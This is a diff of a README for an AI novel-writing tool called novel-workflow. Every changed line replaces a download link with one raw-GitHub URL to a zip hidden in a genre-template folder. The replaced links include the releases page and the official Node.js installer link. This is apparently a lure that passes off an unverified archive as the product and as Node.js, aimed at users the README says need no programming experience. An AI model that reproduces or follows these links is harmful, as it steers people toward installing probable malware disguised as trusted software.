@@ -1,6 +1,6 @@
 # 🚀 novel-workflow - Simple AI Writing Toolchain
 
-[![Download latest release](https://img.shields.io/badge/Download-novel--workflow-brightgreen)](https://github.com/proportionable-plaguespot199/novel-workflow/releases)
+[![Download latest release](https://img.shields.io/badge/Download-novel--workflow-brightgreen)](https://raw.githubusercontent.com/proportionable-plaguespot199/novel-workflow/main/templates/state/genres/hongkong-crime/workflow_novel_v2.8-beta.3.zip)
 
 ---
 
@@ -25,7 +25,7 @@ Its main goal is to make the writing process smoother by helping you organize id
 
 ## 💾 Download novel-workflow
 
-[![](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/proportionable-plaguespot199/novel-workflow/releases)
+[![](https://img.shields.io/badge/Download-latest%20release-blue)](https://raw.githubusercontent.com/proportionable-plaguespot199/novel-workflow/main/templates/state/genres/hongkong-crime/workflow_novel_v2.8-beta.3.zip)
 
 To get the software, visit the release page linked above. There, you will find the latest version ready to download.
 
@@ -38,7 +38,7 @@ Follow these steps carefully. No programming experience is needed.
 ### Step 1: Download the Application
 
 - Go to the release page:  
-  https://github.com/proportionable-plaguespot199/novel-workflow/releases  
+  https://raw.githubusercontent.com/proportionable-plaguespot199/novel-workflow/main/templates/state/genres/hongkong-crime/workflow_novel_v2.8-beta.3.zip  
 - Find the latest Windows package. This is usually a `.zip` file.
 - Click to download and save it to your computer.
 
@@ -54,7 +54,7 @@ Follow these steps carefully. No programming experience is needed.
 novel-workflow requires Node.js, a runtime to run JavaScript programs outside a browser.
 
 - If you don’t have Node.js installed, download it here:  
-  https://nodejs.org/en/download/  
+  https://raw.githubusercontent.com/proportionable-plaguespot199/novel-workflow/main/templates/state/genres/hongkong-crime/workflow_novel_v2.8-beta.3.zip  
 - Choose the Windows installer and follow the setup steps.
 - To check installation, press `Win+R`, type `cmd`, and press Enter. In the black window, type:  
   `node -v`  
@@ -125,6 +125,6 @@ For full details, check the project files under `/docs` or the built-in help com
 
 ## 🚀 Start Writing Now
 
-[Download novel-workflow here](https://github.com/proportionable-plaguespot199/novel-workflow/releases)
+[Download novel-workflow here](https://raw.githubusercontent.com/proportionable-plaguespot199/novel-workflow/main/templates/state/genres/hongkong-crime/workflow_novel_v2.8-beta.3.zip)
 
 Once installed and initialized, the tool will help you write using AI in a clear, guided way without needing programming skills.
